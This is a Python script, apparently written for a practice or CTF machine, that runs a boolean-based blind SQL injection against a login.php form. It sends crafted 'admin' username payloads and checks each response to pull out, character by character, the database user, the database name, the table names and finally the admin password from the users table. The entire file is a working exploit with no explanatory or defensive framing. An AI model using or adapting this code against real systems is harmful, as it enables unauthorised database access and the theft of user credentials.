#!/usr/bin/python

import requests
import string
import warnings

def BlindSQL(sqli):
    url = "http://10.129.22.27/login.php"
    data = {'username':'%s'%(sqli), 'password':'aa'}
    proxies = {'http': 'http://127.0.0.1:8080'}
    req = requests.post(url, data=data, proxies=proxies)
    # proxies = {"http": "http://127.0.0.1:8080"}
    # req = requests.get(url, cookies=cookies, proxies=proxies)
    # print(req.status_code)
    # print()
    if b'Wrong identification : admin' in req.content:
        return True

def get_dbuser():
    chars = string.ascii_lowercase
    chars += string.ascii_uppercase
    chars += "@_/.-$"
    output = ""
    nohit = ""

    for i in range(1,30):
        if nohit == " ":
            break

        for c in chars:
            sqli = "admin' and (select ascii(substr((select current_user()),{},1)))={}-- -".format(str(i), ord(c))
            if BlindSQL(sqli):
                output += c
                print("\rDBUSER: " + output,end="")
                break
            
            if c == chars[len(chars)-1]:
                nohit += " "
    return output


def get_dbname():
    chars = string.ascii_lowercase
    chars += "@_/.-$"
    output = ""
    nohit = ""

    for i in range(1,30):
        if nohit == " ":
            break

        for c in chars:
            sqli = "admin' and (select ascii(substr((select database()), {}, 1)))={}-- -".format(str(i), ord(c))
            if BlindSQL(sqli):
                output += c
                print("\rDBNAME: " + output,end="")
                break
            
            if c == chars[len(chars)-1]:
                nohit += " "
    
    return output

def get_tables(dbname):
    chars = string.ascii_lowercase
    chars += "@_/.-$"
    output_list = []

    for j in range(0,10):
        if j == 1 and output_list[0] == "":
            break
        nohit = ""
        output = ""

        for i in range(1,50):
            if nohit == " ":
                print("")
                output_list.append(output)
                break
            
            for c in chars:
                sqli = "admin' and (select ascii(substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=(select database()) LIMIT {},1), {}, 1)))={}-- -".format(str(j), str(i), ord(c))
                if BlindSQL(sqli):
                    output += c
                    print("\r" + output,end="")
                    break
                
                if c == chars[len(chars)-1]:
                    nohit += " "
    
        print(output_list)
    
    return output_list

def main():
    warnings.simplefilter('ignore')

    # dbuser = get_dbuser()
    # print("")
    # dbname = get_dbname()
    # print("")
    # db_tables = get_tables('hackshop')
    # print("")

    chars = string.ascii_lowercase
    chars += string.digits
    chars += string.ascii_uppercase
    chars += string.punctuation
    # chars += "@_/.-$"


    output_list = []
    
    for j in range(0,10):
        nohit = ""
        output = ""

        for i in range(1,50):
            if nohit == " ":
                print("")
                output_list.append(output)
                break
            
            for c in chars:
                # sqli = " and (select ascii(substr((select token from user limit {},1),{},1)))={}-- -".format(str(j), str(i), ord(c))
                sqli = "admin' and (select ascii(substr((select password from users where username = 'admin'),{},1)))={}-- -".format(str(i), ord(c))
                # sqli = "admin' and (select ascii(substr((select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='users' and table_schema=(select database()) LIMIT {},1),{},1)))={}-- -".format(str(j), str(i), ord(c))
                    # sqli = " and substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='neddy' LIMIT {},1), {}, 1)='{}'-- -".format(str(j), str(i), c)
                # sqli = " and substr((select database()), {}, 1)='{}'-- -".format(str(i), c)
                if BlindSQL(sqli):
                    output += c
                    print("\r" + output,end="")
                    break
                
                if c == chars[len(chars)-1]:
                    nohit += " "
    
        print(output_list)
        
        
if __name__ == "__main__":
    main()